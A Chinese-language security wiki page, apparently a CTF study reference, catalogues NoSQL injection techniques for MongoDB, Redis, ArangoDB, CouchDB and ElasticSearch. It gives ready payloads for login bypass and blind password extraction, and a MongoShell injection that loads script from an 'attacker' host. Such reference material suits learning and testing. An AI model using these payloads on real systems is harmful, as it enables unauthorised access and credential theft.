---
comments: true
---

# NoSQL注入

> WEB · 知识域。非关系型数据库注入:MongoDB/Redis/ArangoDB 等。标签:**PHP数组注入**、**Ruby数组注入**、**JS注入攻击**、**MongoShell注入**、**永真式攻击**、**联合查询攻击**。

## 触发特征

- 后端为 MongoDB/Redis/ArangoDB/CouchDB;输入被拼进 `find()`、`$where`、JSON 查询。
- 登录口对 `username[$ne]=` 之类参数不报错但行为变化。

## PHP数组注入

- PHP 把 `user[$ne]=` 解析为数组 → `find({user:{$ne:1}})` 成立 → 登录绕过。
- `$regex` 逐字符盲注:`user[$regex]=^a` 配合布尔差异恢复完整口令。
- `$gt`/`$lt` 范围永真:`user[$gt]=` 空串匹配一切。

## Ruby数组注入

- Sinatra/Rails 场景 `user[]=` 数组语法同样进入查询结构;`$where` 注入 JS。
- 类型混淆:`{"$type": 2}` 匹配字符串字段探结构。

## JS注入攻击($where)

- `$where` 接受 JavaScript:注入 `sleep(5000)||true` 时间盲注;`this.password[0]=='a'` 布尔外带。
- `$function`/聚合管道 `$accumulator` 注入(新版 MongoDB)。
- MongoDB Regex 注入 / `$where` 盲打 oracle(Nullcon 2026)。

## MongoShell注入

- 服务端直接 `eval` mongo shell 命令(`--eval` 或管理接口)→ 注入 `;load('http://attacker/x.js')` 或 `db.eval`。
- `mapReduce` map 函数注入 JS。
- 未授权访问(27017 无鉴权):直接连库改数据/建管理员。

## 永真式攻击

- `{"$or":[{},{}]}`、`{"$ne":null}`、`{"$exists":true}` 全匹配绕过登录。
- `login?user[$ne]=x&pass[$ne]=y` 组合拿到首个匹配用户。
- **盲注攻击**:无直接回显时靠布尔差异/时延逐字符恢复——
  - `$regex` 前缀逐步:`user[$regex]=^a` → `^ad` → …(布尔盲注);
  - `$where` 注入 `sleep(5000)||this.password[0]=='a'`(时间盲注);
  - `$gt/$lt` 比较法二分(比正则快,按字典序收敛)。
- Redis:`config set dir`/`set` 未授权写文件思路(注入拼命令场景)。

## 联合查询攻击

- ArangoDB AQL `MERGE` 注入提权(P.W.N. CTF 2018)。
- CouchDB `_find` 选择器注入、`_all_docs` 未授权枚举;ElasticSearch DSL 注入(`script_fields` → RCE,VolgaCTF 2017)。
- GraphQL 把 NoSQL 查询作为解析器时,经 alias/batch 放大(→ [CSRF](csrf.md))。

## 工具速查

```bash
# NoSQLMap / 手注模板
POST /login  user[$ne]=a&pass[$ne]=a
user[$regex]=^a.*   # 逐字符
nosql-shell --url URL
```

## 转向

- 注入拿到会话/口令 → [认证绕过](auth-bypass.md);Redis 未授权 → [渗透测试](../pen/index.md)
